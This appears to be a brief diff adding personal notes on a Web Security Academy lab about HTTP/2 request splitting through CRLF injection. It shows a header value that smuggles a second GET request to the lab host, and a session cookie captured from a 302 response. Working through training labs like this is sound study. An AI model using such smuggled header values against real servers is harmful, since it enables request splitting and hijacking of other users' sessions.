@@ -1,0 +1,13 @@
+Lab: HTTP/2 request splitting via CRLF injection
+
+Analysis:
+(1)
+Add new request header:
+key: Foo
+value: bar
+  
+    GET /asdas HTTP/1.1
+    Host: 0ab60039042c2702845331040057001a.web-security-academy.net
+
+(2)
+Cookie in 302 resp: RXvOQfIBqaOhAKxrpUgbu7tkvY1J8AU5
